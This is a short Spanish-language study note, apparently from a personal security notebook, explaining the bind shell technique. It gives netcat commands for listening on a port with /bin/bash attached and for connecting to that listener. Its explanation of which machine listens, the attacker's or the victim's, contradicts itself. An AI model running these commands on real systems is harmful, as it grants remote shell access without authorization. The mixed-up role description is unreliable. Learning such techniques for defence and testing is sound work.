____

- Tags: #herramientas #netcat #redes #ipv4 #bin-shell #enumeración #explotación 

___
# Introducción

En el ámbito de la seguridad informática, una "**bind shell**" es una técnica que implica poner en escucha un puerto específico y, cuando un cliente se conecta a ese puerto, se le otorga acceso a una shell en la máquina atacante. Este enfoque permite a un atacante tomar el control de manera remota. Aquí se presentan algunos comandos relacionados con la creación de una **bind shell**.

____
# Comandos:

1. **Ponerse en modo escucha:**

   ```bash
   nc -lvp puerto -e /bin/bash
   ```
   
   Este comando coloca la máquina atacante en modo escucha en un puerto determinado. Cuando alguien se conecta a la [[Dirección IP|IP]] y puerto especificados, se le concede acceso a una shell en la máquina atacante. El parámetro `-e` especifica el programa a ejecutar cuando se establece la conexión, en este caso, `/bin/bash`.

2. **Conectar a la bind shell:**
   ```bash
   nc ip puerto
   ```
   
   Al ejecutar este comando desde la máquina del atacante y proporcionando la [[Dirección IP|IP]] y puerto de la máquina víctima, se establece la conexión con la **bind shell**. Una vez conectado, el atacante tiene acceso a una shell en la máquina comprometida.
